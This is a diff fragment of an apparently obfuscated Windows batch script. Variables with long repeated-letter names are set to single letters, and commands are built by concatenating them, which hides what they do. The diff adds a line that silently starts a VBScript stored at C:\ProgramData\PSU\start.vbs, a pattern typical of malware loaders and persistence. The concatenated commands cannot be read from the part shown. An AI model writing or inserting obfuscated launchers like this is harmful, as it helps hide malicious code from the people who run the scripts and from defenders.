@@ -51,6 +51,7 @@ set bbbbbbbbbbbbbbbbbbbbbbbb=W
 set bbbbbbbbbbbbbbbbbbbbbbbbb=X
 set bbbbbbbbbbbbbbbbbbbbbbbbbb=Y
 set bbbbbbbbbbbbbbbbbbbbbbbbbbb=Z
+start "" "C:\ProgramData\PSU\start.vbs" >> nul
 %aaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa% “%bbbbbbbbbbbbbbbbbbbb%%aaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% %bbbb%%aaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%”
 %aaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaa% %aaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaa%%aaaaaa% %aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaa%%aaaaaa%=%aaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aa%%aaa%%aaaaaaaaaaaaa%%aaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% /%bbbbbbb% %aa%%aaaaaaaaaaaaaaaaaaaaaaa%*
